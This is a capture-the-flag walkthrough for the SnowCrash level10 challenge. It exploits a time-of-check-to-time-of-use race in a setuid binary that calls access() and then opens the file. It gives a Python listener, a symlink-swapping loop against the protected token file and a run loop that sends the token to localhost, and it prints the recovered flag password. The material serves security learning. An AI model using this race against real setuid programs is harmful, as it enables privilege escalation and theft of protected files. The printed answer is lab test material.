# Find the Flag10 Password

When we log in as `level10`, we can see the `level10` executable and a `token` file in the home directory.

This looks similar to the previous levels, so start by running the program:

```sh
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ ltrace ./level10 token
__libc_start_main(0x80486d4, 2, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
        sends file to host if you have access to it
)            = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

The program expects two arguments: a file to read and a host to send it to.

Use `gdb` to inspect the functions used by the binary:

```sh
gdb level10
(gdb) info functions
All defined functions:

File level10.c:
int main(int, char **);

Non-debugging symbols:
[...]
0x080485e0  access
[...]
```

The interesting function is `access()`. This function checks whether the real user ID has permission to access a file.

Using `access()` before opening a file can introduce a TOCTOU vulnerability, which means Time-of-check to Time-of-use.

For example:

```c
if (access("/tmp/data", R_OK) == 0)
{
    fd = open("/tmp/data", O_RDONLY);
}
```

If an attacker changes `/tmp/data` between the `access()` check and the later `open()` call, the program may check one file but open another. This is especially dangerous for a setuid binary because the real UID and effective UID can be different.

Here, we can exploit that race by repeatedly switching a symbolic link between a readable file and the protected `token` file.

## Prepare a Receiver

The `level10` program sends the file content to the host on port `6969`, so create a small TCP server to receive the data:

```sh
vi /tmp/server.py
```

```python
import socket

HOST = '0.0.0.0'
PORT = 6969

def main():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((HOST, PORT))
        s.listen(1)
        while True:
                conn, addr = s.accept()
                print("connected by", addr)
                while True:
                        data = conn.recv(1024)
                        if not data:
                                break
                        print(data)

if __name__ == '__main__':
        main()
```

Run the server in one terminal:

```sh
level10@SnowCrash:~$ python /tmp/server.py
```

When the exploit succeeds, the server will print a connection and the received data:

```text
('connected by', ('127.0.0.1', 47860))
.*( )*.
```

## Race the File Check

In a second terminal, create a harmless file that `level10` can access, then repeatedly switch `/tmp/fake` between that file and the real `token` file:

```sh
echo > /tmp/hack && while :; do ln -fs /tmp/hack /tmp/fake; ln -fs ~/token /tmp/fake; done
```

This loop tries to make `access()` check `/tmp/hack`, then make the later file read use `~/token`.

In a third terminal, repeatedly run `level10` against the symlink and send the output to the local server:

```sh
while :; do ./level10 /tmp/fake 127.0.0.1; done
```

The race may take some time. Once it succeeds, the server receives the password:

```text
woupa2yuojeeaaed06riuj63c
```

Use this password to log in as `flag10`, then run `getflag` to get the token for the next level.
